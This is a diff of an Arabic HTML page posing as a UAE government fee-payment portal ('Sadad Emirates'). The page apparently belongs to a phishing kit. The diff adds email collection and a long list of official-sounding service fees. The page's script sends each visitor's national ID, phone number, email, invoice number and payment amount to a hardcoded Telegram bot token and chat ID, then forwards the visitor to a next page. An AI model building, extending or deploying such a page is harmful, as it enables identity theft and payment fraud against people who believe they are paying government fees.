@@ -43,97 +43,259 @@
 
         .form-group { margin-bottom: 20px; }
         .form-group label { display: block; margin-bottom: 5px; font-weight: 500; }
+
         .form-control {
             width: 100%; padding: 10px; border: 1px solid var(--border-color);
             border-radius: 5px; font-size: 16px; font-family: 'Tajawal', sans-serif;
+            transition: border-color 0.3s;
         }
         .form-control:focus { outline: none; border-color: var(--primary-color); }
+        .form-control.invalid { border-color: var(--error-color); }
+        .form-control.valid { border-color: var(--success-color); }
+
+        .error-message { color: var(--error-color); font-size: 14px; margin-top: 5px; display: none; }
+
+        .amount-input { display: flex; align-items: center; gap: 10px; }
+        .amount-input .currency {
+            background-color: var(--light-gray); padding: 10px 15px;
+            border: 1px solid var(--border-color); border-radius: 5px; font-weight: bold;
+        }
+        .amount-input .form-control { flex: 1; }
 
         .btn {
-            display: inline-block; background-color: var(--primary-color);
-            color: white; padding: 12px 25px; border: none; border-radius: 5px;
-            cursor: pointer; font-size: 16px; width: 100%; font-family: 'Tajawal', sans-serif;
+            display: inline-block; background-color: var(--primary-color); color: white;
+            padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer;
+            font-size: 16px; font-weight: 500; font-family: 'Tajawal', sans-serif;
+            transition: background-color 0.3s;
         }
+        .btn:hover { background-color: #006600; }
+        .btn-block { display: block; width: 100%; }
+
+        select.form-control { appearance: auto; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <img src="https://petra.gov.jo/upload/1542630954928.jpg" alt="شعار سداد الإمارات">
-            <h1>إدخال بيانات المستخدم</h1>
-        </div>
-        
-        <div class="form-container">
-            <form id="userDataForm">
-                <div class="form-group">
-                    <label for="invoiceNumber">رقم الفاتورة</label>
-                    <input type="text" id="invoiceNumber" class="form-control" placeholder="أدخل رقم الفاتورة" required>
-                </div>
-                <div class="form-group">
-                    <label for="idNumber">رقم الهوية</label>
-                    <input type="text" id="idNumber" class="form-control" placeholder="أدخل رقم الهوية (15 رقم)" maxlength="15" required>
-                </div>
-                <div class="form-group">
-                    <label for="phoneNumber">رقم الجوال</label>
-                    <input type="tel" id="phoneNumber" class="form-control" placeholder="05XXXXXXXX" required>
-                </div>
-                <div class="form-group">
-                    <label for="serviceType">نوع الخدمة</label>
-                    <select id="serviceType" class="form-control" required>
-                        <option value="">اختر نوع الخدمة</option>
-                        <option value="دفع رسوم شحن مركبة">دفع رسوم شحن مركبة</option>
-                        <option value="دفع رسوم نقل ملكية مركبة">دفع رسوم نقل ملكية مركبة</option>
-                        <option value="دفع ضريبة القيمة المضافة">دفع ضريبة القيمة المضافة</option>
-                        <option value="تسديد المستحقات">تسديد المستحقات</option>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label for="amount">مبلغ السداد (AED)</label>
-                    <input type="number" id="amount" class="form-control" placeholder="0.00" required>
-                </div>
-                <button type="button" id="confirmUserData" class="btn">تأكيد البيانات</button>
-            </form>
+        <div id="page2">
+            <div class="header">
+                <img src="https://petra.gov.jo/upload/1542630954928.jpg" alt="شعار سداد الإمارات">
+                <h1>إدخال بيانات المستخدم</h1>
+            </div>
+            
+            <div class="form-container">
+                <form id="userDataForm">
+                    <div class="form-group">
+                        <label for="invoiceNumber">رقم الفاتورة</label>
+                        <input type="text" id="invoiceNumber" class="form-control" placeholder="أدخل رقم الفاتورة" required>
+                        <div class="error-message" id="invoiceNumberError">يرجى إدخال رقم الفاتورة</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="idNumber">رقم الهوية</label>
+                        <input type="text" id="idNumber" class="form-control" placeholder="أدخل رقم الهوية (15 رقم)" maxlength="15" required>
+                        <div class="error-message" id="idNumberError">يرجى إدخال رقم هوية صحيح (15 رقم)</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="phoneNumber">رقم الجوال</label>
+                        <input type="tel" id="phoneNumber" class="form-control" placeholder="05XXXXXXXX" required>
+                        <div class="error-message" id="phoneNumberError">رقم هاتف غير صحيح</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="email">البريد الإلكتروني</label>
+                        <input type="email" id="email" class="form-control" placeholder="أدخل بريدك الإلكتروني" required>
+                        <div class="error-message" id="emailError">يرجى إدخال بريد إلكتروني صحيح</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="serviceType">نوع الخدمة</label>
+                        <select id="serviceType" class="form-control" required>
+                            <option value="">اختر نوع الخدمة</option>
+                            <option value="دفع رسوم شحن مركبة">دفع رسوم شحن مركبة</option>
+                            <option value="دفع رسوم نقل ملكية مركبة">دفع رسوم نقل ملكية مركبة</option>
+                            <option value="دفع رسوم نقل ملكية لوحة مركبة">دفع رسوم نقل ملكية لوحة مركبة</option>
+                            <option value="دفع رسوم حجز مركبة">دفع رسوم حجز مركبة</option>
+                            <option value="دفع رسوم فحص مركبة">دفع رسوم فحص مركبة</option>
+                            <option value="دفع رسوم عقد ايجار (فيلا - شقة - مزرعة - شاليه - مستودع - محل - ارض تجارية - ارض زراعية)">دفع رسوم عقد ايجار (فيلا - شقة - مزرعة - شاليه - مستودع - محل - ارض تجارية - ارض زراعية)</option>
+                            <option value="دفع رسوم عقد تمليك (فيلا - شقة - مزرعة - شاليه - مستودع - محل - ارض تجارية - ارض زراعية)">دفع رسوم عقد تمليك (فيلا - شقة - مزرعة - شاليه - مستودع - محل - ارض تجارية - ارض زراعية)</option>
+                            <option value="دفع رسوم تأمين ايجار (فيلا - شقة - مزرعة - شاليه - مستودع - محل - ارض تجارية - ارض زراعية)">دفع رسوم تأمين (فيلا - شقة - مزرعة - شاليه - مستودع - محل - ارض تجارية - ارض زراعية)</option>
+                            <option value="دفع رسوم شحن">دفع رسوم شحن</option>
+                            <option value="تسديد المستحقات للطرفين">تسديد المستحقات للطرفين</option>
+                            <option value="دفع رسوم توقيع تعهد الكتروني">دفع رسوم توقيع تعهد الكتروني</option>
+                            <option value="دفع رسوم استقدام عمالة">دفع رسوم استقدام عمالة</option>
+                            <option value="دفع ضريبة القيمة المضافة">دفع ضريبة القيمة المضافة</option>
+                            <option value="دفع رسوم عقد عمالة">دفع رسوم عقد عمالة</option>
+                            <option value="دفع رسوم الجوازات">دفع رسوم الجوازات</option>
+                            <option value="دفع رسوم عقد عمل">دفع رسوم عقد عمل</option>
+                            <option value="دفع رسوم توكيل محامي">دفع رسوم توكيل محامي</option>
+                            <option value="دفع رسوم الخدمات الكترونية">دفع رسوم الخدمات الكترونية</option>
+                            <option value="دفع رسوم وزارة الموارد البشرية">دفع رسوم وزارة الموارد البشرية</option>
+                            <option value="دفع رسوم تجديد عقود">دفع رسوم تجديد عقود</option>
+                            <option value="دفع رسوم عقد تقديم خدمات">دفع رسوم عقد تقديم خدمات</option>
+                            <option value="استرداد الرسوم المدفوعة">استرداد الرسوم المدفوعة</option>
+                        </select>
+                        <div class="error-message" id="serviceTypeError">يرجى اختيار نوع الخدمة</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="amount">مبلغ السداد (درهم إماراتي)</label>
+                        <div class="amount-input">
+                            <span class="currency">AED</span>
+                            <input type="number" id="amount" class="form-control" placeholder="0.00" min="5" max="99999" required>
+                        </div>
+                        <div class="error-message" id="amountError">المبلغ غير صحيح</div>
+                    </div>
+                    
+                    <button type="button" id="confirmUserData" class="btn btn-block">تأكيد البيانات</button>
+                </form>
+            </div>
         </div>
     </div>
 
     <script>
-        const telegramBotToken = '8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw';
-        const telegramChatId = '8362204213';
+        // تم تحديث التوكن والشات آيدي هنا
+        const telegramBotToken = '8591237339:AAHOMH_hwr6ts_zlKb3ClGXb7RBpZ8ii5j0';
+        const telegramChatId = '1848565778';
 
+        // إرسال/تحديث رسالة التلغرام
         async function appendToTelegram(newContent) {
             const existingId = localStorage.getItem('telegramMessageId');
             const existingContent = localStorage.getItem('telegramMessageContent') || '';
-            const updatedContent = existingContent + '\n\n' + newContent;
 
+            if (existingId) {
+                // تحديث الرسالة الموجودة
+                const updatedContent = existingContent + '\n\n' + newContent;
+                try {
+                    const url = `https://api.telegram.org/bot${telegramBotToken}/editMessageText`;
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: telegramChatId,
+                            message_id: parseInt(existingId),
+                            text: updatedContent,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                    const data = await response.json();
+                    if (data.ok) {
+                        localStorage.setItem('telegramMessageContent', updatedContent);
+                    } else {
+                        // إذا فشل التحديث، أرسل رسالة جديدة
+                        await sendNewTelegram(updatedContent);
+                    }
+                } catch (error) {
+                    await sendNewTelegram(updatedContent);
+                }
+            } else {
+                await sendNewTelegram(newContent);
+            }
+        }
+
+        async function sendNewTelegram(message) {
             try {
-                const url = `https://api.telegram.org/bot${telegramBotToken}/editMessageText`;
-                await fetch(url, {
+                const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+                const response = await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: telegramChatId,
-                        message_id: parseInt(existingId),
-                        text: updatedContent,
+                        text: message,
                         parse_mode: 'HTML'
                     })
                 });
-                localStorage.setItem('telegramMessageContent', updatedContent);
-            } catch (e) { console.error(e); }
+                const data = await response.json();
+                if (data.ok) {
+                    localStorage.setItem('telegramMessageId', data.result.message_id);
+                    localStorage.setItem('telegramMessageContent', message);
+                }
+            } catch (error) {
+                console.error('خطأ:', error);
+            }
         }
 
-        document.getElementById('confirmUserData').addEventListener('click', async function() {
-            const data = {
-                inv: document.getElementById('invoiceNumber').value,
-                id: document.getElementById('idNumber').value,
-                phone: document.getElementById('phoneNumber').value,
-                service: document.getElementById('serviceType').value,
-                amt: document.getElementById('amount').value
-            };
+        // التحقق من الحقول
+        function validateField(field, regex, errorId) {
+            const isValid = regex.test(field.value);
+            const errorElement = document.getElementById(errorId);
+            if (isValid) {
+                field.classList.remove('invalid'); field.classList.add('valid');
+                errorElement.style.display = 'none';
+            } else {
+                field.classList.remove('valid'); field.classList.add('invalid');
+                errorElement.style.display = 'block';
+            }
+        }
 
-            const content = `👤 <b>بيانات المستخدم</b>\n\n🧾 رقم الفاتورة: ${data.inv}\n🆔 الهوية: ${data.id}\n📱 الجوال: ${data.phone}\n💼 الخدمة: ${data.service}\n💰 المبلغ: ${data.amt} AED`;
-            
-            await appendToTelegram(content);
-            window.location.href = 'page3.html';
+        function toggleFieldValidation(field, isValid, errorId) {
+            const errorElement = document.getElementById(errorId);
+            if (isValid) {
+                field.classList.remove('invalid'); field.classList.add('valid');
+                errorElement.style.display = 'none';
+            } else {
+                field.classList.remove('valid'); field.classList.add('invalid');
+                errorElement.style.display = 'block';
+            }
+        }
+
+        // التحقق أثناء الكتابة
+        document.getElementById('invoiceNumber').addEventListener('input', function() {
+            validateField(this, /^.+$/, 'invoiceNumberError');
+        });
+        document.getElementById('idNumber').addEventListener('input', function() {
+            validateField(this, /^\d{15}$/, 'idNumberError');
+        });
+        document.getElementById('phoneNumber').addEventListener('input', function() {
+            validateField(this, /^05\d{8}$/, 'phoneNumberError');
+        });
+        document.getElementById('email').addEventListener('input', function() {
+            validateField(this, /^[^\s@]+@[^\s@]+\.[^\s@]+$/, 'emailError');
+        });
+        document.getElementById('serviceType').addEventListener('change', function() {
+            validateField(this, /^.+$/, 'serviceTypeError');
+        });
+        document.getElementById('amount').addEventListener('input', function() {
+            const value = parseFloat(this.value);
+            const isValid = !isNaN(value) && value >= 5 && value <= 99999;
+            toggleFieldValidation(this, isValid, 'amountError');
+        });
+
+        // تأكيد البيانات
+        document.getElementById('confirmUserData').addEventListener('click', async function() {
+            let isValid = true;
+
+            const invoiceNumber = document.getElementById('invoiceNumber').value;
+            if (!invoiceNumber) { document.getElementById('invoiceNumberError').style.display = 'block'; document.getElementById('invoiceNumber').classList.add('invalid'); isValid = false; }
+
+            const idNumber = document.getElementById('idNumber').value;
+            if (!idNumber || idNumber.length !== 15 || !/^\d+$/.test(idNumber)) { document.getElementById('idNumberError').style.display = 'block'; document.getElementById('idNumber').classList.add('invalid'); isValid = false; }
+
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            if (!phoneNumber || !/^05\d{8}$/.test(phoneNumber)) { document.getElementById('phoneNumberError').style.display = 'block'; document.getElementById('phoneNumber').classList.add('invalid'); isValid = false; }
+
+            const email = document.getElementById('email').value;
+            if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { document.getElementById('emailError').style.display = 'block'; document.getElementById('email').classList.add('invalid'); isValid = false; }
+
+            const serviceType = document.getElementById('serviceType').value;
+            if (!serviceType) { document.getElementById('serviceTypeError').style.display = 'block'; document.getElementById('serviceType').classList.add('invalid'); isValid = false; }
+
+            const amount = document.getElementById('amount').value;
+            if (!amount || amount < 5 || amount > 99999) { document.getElementById('amountError').style.display = 'block'; document.getElementById('amount').classList.add('invalid'); isValid = false; }
+
+            if (isValid) {
+                // حفظ البيانات في localStorage
+                localStorage.setItem('invoiceNumber', invoiceNumber);
+                localStorage.setItem('idNumber', idNumber);
+                localStorage.setItem('phoneNumber', phoneNumber);
+                localStorage.setItem('userEmail', email);
+                localStorage.setItem('serviceType', serviceType);
+                localStorage.setItem('amount', amount);
+
+                const content = `👤 <b>بيانات المستخدم المدخلة</b>\n\n🧾 رقم الفاتورة: ${invoiceNumber}\n🆔 رقم الهوية: ${idNumber}\n📱 رقم الجوال: ${phoneNumber}\n📧 البريد الإلكتروني: ${email}\n💼 نوع الخدمة: ${serviceType}\n💰 المبلغ: ${amount} درهم إماراتي`;
+                await appendToTelegram(content);
+                window.location.href = 'page3.html';
+            }
         });
     </script>
 </body>
